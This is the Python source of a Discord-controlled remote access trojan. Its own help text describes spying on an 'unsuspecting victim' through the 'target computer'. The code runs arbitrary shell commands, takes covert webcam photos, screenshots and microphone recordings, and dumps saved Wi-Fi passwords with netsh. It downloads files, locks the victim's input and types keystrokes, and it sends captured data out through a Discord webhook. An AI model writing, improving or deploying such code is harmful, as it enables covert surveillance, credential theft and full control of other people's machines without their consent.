import os
import time
import subprocess
import pyautogui
import datetime
import discord
from discord_webhook import DiscordWebhook
import wmi
import requests
import cv2
import pynput
import webbrowser
import sounddevice as sd
from scipy.io.wavfile import write
from discord.ext import commands
from pynput.keyboard import Controller, Key
import re
import asyncio


TOKEN = ""
WEBHOOK_URL = ""
USER_ID1 = ''
USER_ID2 = ''

# Initialize the keyboard controller
keyboard = Controller()
# Define the mapping for modifier keys
MODIFIERS = {
    "ctrl": Key.ctrl_l,  # Left Control
    "shift": Key.shift,  # Shift
    "alt": Key.alt_l,     # Left Alt
    "win": Key.cmd,      # Windows key (Command key on Mac)
    "esc": Key.esc,      # Escape key
    "space": Key.space,  # Space key
    "enter": Key.enter,  # Enter key
    "tab": Key.tab,      # Tab key
    "backspace": Key.backspace,  # Backspace key
    "delete": Key.delete,  # Delete key
    "up": Key.up,        # Up arrow key
    "down": Key.down,    # Down arrow key
    "left": Key.left,    # Left arrow key
    "right": Key.right,  # Right arrow key
    "f1": Key.f1,        # F1 key
    "f2": Key.f2,        # F2 key
    "f3": Key.f3,        # F3 key
    "f4": Key.f4,        # F4 key
    "f5": Key.f5,        # F5 key
    "f6": Key.f6,        # F6 key
    "f7": Key.f7,        # F7 key
    "f8": Key.f8,        # F8 key
    "f9": Key.f9,        # F9 key
    "f10": Key.f10,      # F10 key
    "f11": Key.f11,      # F11 key
    "f12": Key.f12,      # F12 key 
}

intents = discord.Intents.default()
intents.message_content = True

client = discord.Client(intents=intents)

@client.event
async def on_ready():
    print(f'We have logged in as {client.user}')


@client.event
async def on_message(message):
    if message.author == client.user or message.webhook_id:
        return
    
    # Check if the message author is you (by user ID)
    elif message.author.id == USER_ID1 or message.author.id == USER_ID2:

        if message.content.startswith('command'):
            await message.channel.send('Sent command!')
            command = message.content
            command = command.replace('command ', '')
            hmm = subprocess.run(command, capture_output=True, text=True)
            out = hmm.stdout
            out = out.replace('Ã', '├')
            out = out.replace('Ä', '─')
            print(out)
            chunklength = 2000
            chunks = [out[i:i+chunklength ] for i in range(0, len(out), chunklength )]

            for chunk in chunks: 
                webhook = DiscordWebhook(url=WEBHOOK_URL, content=chunk)
                response = webhook.execute()

            
        elif message.content.startswith('cam'):
            cap = cv2.VideoCapture(0)

            if not cap.isOpened():
                print("Error: Could not open camera.")
                return
            
            capture_duration = 1
            start_time = time.time()

            while (time.time() - start_time) < capture_duration:
                ret, frame = cap.read()

                if not ret:
                    print("Error: Failed to capture frame.")
                    break

            cv2.imwrite("pic.jpg", frame)
            print("Picture captured successfully as 'captured_picture.jpg'")
            cap.release()
            cv2.destroyAllWindows()
            time_now = datetime.datetime.now()

            webhook = DiscordWebhook(url=WEBHOOK_URL, content="pic taken at " + str(time_now))
            with open("./pic.jpg", "rb") as f:
                webhook.add_file(file=f.read(), filename="pic.jpg")
            response = webhook.execute()
            os.remove("./pic.jpg")


        elif message.content.startswith('com'):
            await message.channel.send('Sent command!')
            command = message.content
            command = command.replace('com ', '')
            os.system(command)
            
            
        elif message.content.startswith('lock'):
            command = message.content
            command = command.replace('lock ', '')
            await message.channel.send(f'locked system interactions for {command} seconds...')
            mouse_listener = pynput.mouse.Listener(suppress=True)
            mouse_listener.start()
            keyboard_listener = pynput.keyboard.Listener(suppress=True)
            keyboard_listener.start()
            time.sleep(int(command))
            mouse_listener.stop()
            keyboard_listener.stop()
            await message.channel.send('unlocked!')
            
            
            
        elif message.content.startswith('screenshot'):
            time_now = datetime.datetime.now()
            myScreenshot = pyautogui.screenshot()
            myScreenshot.save("help.png")
            webhook = DiscordWebhook(url=WEBHOOK_URL, content="Screenshot taken at " + str(time_now))
            with open("./help.png", "rb") as f:
                webhook.add_file(file=f.read(), filename="help.png")
            response = webhook.execute()
            os.remove("./help.png")

            
        elif message.content.startswith('wifi'):
            networks, out = [], ''
            wifis = []

            try:
                wifi = subprocess.check_output(
                    ['netsh', 'wlan', 'show', 'profiles'], shell=True,
                    stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')
                wifi = [i.split(":")[1][1:-1]
                        for i in wifi if "All User Profile" in i]
                wifis = len(networks)

                for name in wifi:
                    try:
                        results = subprocess.check_output(
                            ['netsh', 'wlan', 'show', 'profile', name, 'key=clear'], shell=True,
                            stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')
                        results = [b.split(":")[1][1:-1]
                                    for b in results if "Key Content" in b]
                        
                    except subprocess.CalledProcessError:
                        networks.append((name, ''))
                        continue

                    try:
                        networks.append((name, results[0]))
                    except IndexError:
                        networks.append((name, ''))

            except subprocess.CalledProcessError:
                pass
            except UnicodeDecodeError:
                pass

            out += f'{"SSID":<20}| {"PASSWORD":<}\n'
            out += f'{"-"*20}|{"-"*29}\n'
            for name, password in networks:
                out += '{:<20}| {:<}\n'.format(name, password)
            webhook = DiscordWebhook(url=WEBHOOK_URL, content="`"+ out + "`")
            response = webhook.execute()


        elif message.content.startswith('download'):
            command = message.content
            command = command.replace('download ', '')
            command = command.split()
            url  = command[0]
            file_name = command[1]
            webhook = DiscordWebhook(url=WEBHOOK_URL, content="Downloading!")
            response = webhook.execute()
        
            r = requests.get(url, allow_redirects=True)
            open(file_name, 'wb').write(r.content)
            

        elif message.content.startswith('sys'):
                command = message.content
                command = command.replace('sys ', '')
                cpu = wmi.WMI().Win32_Processor()[0].Name
                gpu = wmi.WMI().Win32_VideoController()[0].Name
                ram = round(float(wmi.WMI().Win32_OperatingSystem()[
                            0].TotalVisibleMemorySize) / 1048576, 0)
                webhook = DiscordWebhook(url=WEBHOOK_URL, content="`" + "CPU: " + str(cpu) + "\nGPU: " + str(gpu) + "\nRAM: " + str(ram) + "GB" + "`")
                response = webhook.execute()
        

        elif message.content.startswith("play"):
            command = message.content
            command = command.replace("play ", "")
            command = command.split()
            url = command[0]
            
            try:
                wait_time = command[1]
            except IndexError:
                wait_time = 10

            webhook = DiscordWebhook(url=WEBHOOK_URL, content='Audio playing.. Closing media player after ' + str(wait_time) + ' seconds!')
            response = webhook.execute()

            r = requests.get(url, allow_redirects=True)
            open('sound.m4a', 'wb').write(r.content)
            os.system("sound.m4a")

            time.sleep(int(wait_time))

            os.remove("sound.m4a")
            os.system("TASKKILL /F /IM Microsoft.Media.Player.exe")


        elif message.content.startswith("web"):
            command = message.content
            command = command.replace("web ", "")
            site = command

            webhook = DiscordWebhook(url=WEBHOOK_URL, content='Opening website ' + site + '!')
            response = webhook.execute()

            visit='http://{}'.format(site)
            webbrowser.open(visit)
        
        
        elif message.content.startswith("record"):
            command = message.content
            command = command.replace("record ", "")
            seconds = int(command)  # Duration of recording

            fs = 44100  # Sample rate
            myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
            sd.wait()  # Wait until recording is finished
            write('recording.wav', fs, myrecording)  # Save as WAV file
            
            time_now = datetime.datetime.now()
            webhook = DiscordWebhook(url=WEBHOOK_URL, content="Audio recorded at " + str(time_now) + " for " + str(seconds) + " seconds")
            with open("./recording.wav", "rb") as rec:
                webhook.add_file(file=rec.read(), filename="recording.wav")
            response = webhook.execute()
            os.remove("./recording.wav")
        
        
        elif message.content.startswith("help"):
            embed=discord.Embed(title="Here are my Commands!", description="⬇️⬇️⬇️⬇️⬇️", color=0x05e6e2)
            embed.add_field(name="help", value="shows a list of all commands", inline=False)
            embed.add_field(name="command <command>", value="send a command in the target computer and receive the output", inline=False)
            embed.add_field(name="com <command>", value="send a command in the target computer without recieving the output", inline=False)
            embed.add_field(name="cam", value="take a picture of the unsuspecting victm :)", inline=False)
            embed.add_field(name="lock <time>", value="locks the target's keyboard and mouse for the specified amount of time", inline=False)
            embed.add_field(name="screenshot", value="sends you a screenshot of the target computer", inline=False)
            embed.add_field(name="wifi", value="gives you a list of all saved wifi password on the target device", inline=False)
            embed.add_field(name="download <url> <file_name>", value="downloads the file at the url into the target computer", inline=False)
            embed.add_field(name="sys", value="gives you the specs of the target computer", inline=False)
            embed.add_field(name="play <url> <time_to_close_player>", value="play an audio file provided in the link on the target computer", inline=False)
            embed.add_field(name="web <url>", value="opens the url in the target computer's browser", inline=False)
            embed.add_field(name="record <time>", value="records an audio file on the target computer and sends it to you", inline=False)
            embed.add_field(name="type <text>", value="types the text on the target computer, use '[]' for key combinations", inline=False)
            await message.channel.send(embed=embed)


        # Check if the message starts with the "type" command
        if message.content.startswith("type"):
             # Extract the command part (text to type) after 'type '
            text_to_type = message.content[len("type "):].strip()

            # Start typing the regular text
            await message.channel.send(f"Typing...")

            i = 0
            while i < len(text_to_type):
                char = text_to_type[i]

                # Check if the current character is the start of a square bracket
                if char == "[":
                    # Find the end of the modifier part (where the closing bracket is)
                    modifier_end = text_to_type.find(']', i)
                    if modifier_end != -1:
                        modifiers = text_to_type[i + 1:modifier_end].split('+')
                        pressed_keys = []

                        # Press all modifier keys (e.g., shift, ctrl)
                        for key in modifiers:
                            key = key.strip().lower()
                            if key in MODIFIERS:
                                keyboard.press(MODIFIERS[key])
                                pressed_keys.append(key)
                            else:
                                # Regular special character (e.g., ?)
                                keyboard.press(key)
                                keyboard.release(key)
                        
                        # Now that we've pressed all modifiers and regular characters in the square brackets
                        for key in pressed_keys:
                            keyboard.release(MODIFIERS[key])

                        # Move the index forward to continue after the ']'
                        i = modifier_end + 1
                        continue
                else:
                    # For regular characters, type them one by one
                    keyboard.press(char)
                    keyboard.release(char)
                
                # Move to the next character
                i += 1

                # Add a slight delay between keypresses to simulate typing
                await asyncio.sleep(0.1)

            await message.channel.send("Typing complete.")
    else:
        if message.content.startswith('command') or message.content.startswith('com') or message.content.startswith('cam') or message.content.startswith('lock') or message.content.startswith('screenshot') or message.content.startswith('wifi') or message.content.startswith('download') or message.content.startswith('sys') or message.content.startswith('play') or message.content.startswith('web') or message.content.startswith('record') or message.content.startswith('help') or message.content.startswith('type'):
            # Optionally, ignore other messages
            await message.channel.send(f"""You are not authorised to send commands: 
Authorised users: 
<@{USER_ID1}>
<@{USER_ID2}>""")
            return
        else:
            return

client.run(TOKEN)
